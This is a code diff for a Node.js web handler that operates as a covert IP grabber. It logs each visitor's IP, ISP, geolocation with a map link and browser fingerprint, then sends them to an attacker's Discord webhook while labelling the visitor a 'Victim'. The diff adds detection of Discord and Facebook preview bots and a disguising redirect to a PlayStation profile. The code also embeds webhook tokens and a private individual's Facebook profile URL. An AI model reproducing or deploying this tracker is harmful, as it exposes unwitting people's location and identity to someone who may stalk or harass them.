@@ -1,6 +1,7 @@
 import fetch from 'node-fetch';
 
-const webhookUrl = "https://discord.com/api/webhooks/1306087539169296484/vP5BQM6ius3zPupcdWazfCNQNpuEFstMUeSYKpVJ5i_vxTxWpdyo2mWcHqQDXC7Y0Tr3";
+const webhookUrl = "https://discord.com/api/webhooks/1317579965285531648/IyHYlXpJrQjNnFwG7N7MMusqOGxoJITSPHbIdkWfDaaMX-okBoxRL0cmGmyrT89dyd69";
+let messageSent = false; // Control variable to prevent multiple sends
 
 async function sendToWebhook(message) {
     try {
@@ -58,15 +59,12 @@ export default async function handler(req, res) {
             return;
         }
 
-        // Debug: Check the hosting value in ipDetails
-        console.log("Hosting status:", ipDetails.hosting);
-
         const userAgent = req.headers['user-agent'] || 'Unknown';
         const acceptLanguage = req.headers['accept-language'] || 'Unknown';
         const acceptEncoding = req.headers['accept-encoding'] || 'Unknown';
         const doNotTrack = req.headers['dnt'] === '1' ? 'Yes' : 'No';
         const referer = req.headers['referer'] || 'No referer';
-        
+
         const deviceType = detectDeviceType(userAgent);
         const browserEngine = /Chrome|Chromium|Edg/.test(userAgent) ? 'Blink' :
                               /Safari/.test(userAgent) ? 'WebKit' :
@@ -81,12 +79,13 @@ export default async function handler(req, res) {
             ? `[${ipDetails.lat}, ${ipDetails.lon}](https://www.google.com/maps?q=${ipDetails.lat},${ipDetails.lon})`
             : "Not available";
 
-        const message = ipDetails.hosting
-            ? {
+        // Check 1: Google LLC and Discordbot
+        if (!messageSent && ipDetails.isp === "Google LLC" && userAgent.includes("Discordbot/2.0")) {
+            const message = {
                 embeds: [
                     {
-                        title: "User Send Link To Victim",
-                        color: 0xFF0000, // Red color to indicate alert
+                        title: "User Send Link To Victim from Discord Message",
+                        color: 0xFF0000,
                         description: "Device info collected from sender.",
                         fields: [
                             { name: "IP", value: `\`${ipDetails.query || "Not available"}\``, inline: true },
@@ -95,14 +94,44 @@ export default async function handler(req, res) {
                         ]
                     }
                 ]
-            }
-            : {
+            };
+            await sendToWebhook(message);
+            messageSent = true;
+            res.writeHead(302, { Location: 'https://profile.playstation.com/LB7' });
+            return res.end();
+        }
+
+        // Check 2: Facebook External Hit
+        if (!messageSent && ipDetails.isp === "Facebook, Inc." && userAgent.includes("facebookexternalhit/1.1")) {
+            const message = {
+                embeds: [
+                    {
+                        title: "User Send Link To Victim Facebook/Instagram Message",
+                        color: 0xFF0000,
+                        description: "Device info collected from sender.",
+                        fields: [
+                            { name: "IP", value: `\`${ipDetails.query || "Not available"}\``, inline: true },
+                            { name: "Provider", value: `\`${ipDetails.isp || "Unknown"}\``, inline: true },
+                            { name: "Country", value: `\`${ipDetails.country || "Unknown"}\``, inline: true },
+                        ]
+                    }
+                ]
+            };
+            await sendToWebhook(message);
+            messageSent = true;
+            res.writeHead(302, { Location: 'https://profile.playstation.com/LB7' });
+            return res.end();
+        }
+
+        // Default: Full Info for Other Requests
+        if (!ipDetails.hosting) {
+            const message = {
                 embeds: [
                     {
                         title: "User Opened Link",
                         color: 0x00FFFF,
                         description: "Device info collected from Victim.",
-                        fields: [
+                         fields: [
                             { name: "IP", value: `\`${ipDetails.query || "Not available"}\``, inline: true },
                             { name: "Provider", value: `\`${ipDetails.isp || "Unknown"}\``, inline: true },
                             { name: "Organization", value: `\`${ipDetails.org || "Unknown"}\``, inline: true },
@@ -125,16 +154,15 @@ export default async function handler(req, res) {
                             { name: "Referer", value: `\`${referer}\``, inline: false },
                             { name: "Network Type", value: `\`${ipDetails.mobile ? "Mobile" : "Broadband"}\``, inline: true },
                             { name: "Using Proxy/VPN", value: `\`${ipDetails.proxy ? "Yes" : "No"}\``, inline: true },
-                            { name: "Hosting", value: `\`No\``, inline: true }
+                            { name: "Hosting", value: "\`No\`", inline: true }
                         ]
                     }
                 ]
             };
+            await sendToWebhook(message);
+        }
 
-        // Send the message to the webhook
-        await sendToWebhook(message);
-        
-        res.writeHead(302, { Location: 'https://www.facebook.com/janethalejandra.gonzalez.7?mibextid=LQQJ4d' });
+        res.writeHead(302, { Location: 'https://profile.playstation.com/LB7' });
         res.end();
     } else {
         res.status(405).send("Method Not Allowed");
